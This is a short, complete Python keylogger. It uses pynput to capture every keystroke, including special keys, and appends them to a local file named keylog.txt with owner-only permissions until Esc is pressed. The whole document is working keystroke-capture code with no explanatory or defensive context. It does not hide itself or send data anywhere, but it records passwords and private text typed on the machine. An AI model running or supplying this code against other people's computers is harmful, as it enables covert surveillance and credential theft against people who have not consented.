from pynput import keyboard
import os

# Specify the file to which keystrokes will be logged
log_file = "keylog.txt"

# Ensure the log file is created with restricted permissions (only for the current user)
if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        os.chmod(log_file, 0o600)  # Set file permissions to -rw-------

def on_press(key):
    try:
        # Log the key pressed
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")
    except Exception as e:
        print(f"Error logging key press: {e}")

def on_release(key):
    # Optionally, you can stop the listener by checking for a specific key
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keyboard listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error starting keyboard listener: {e}")
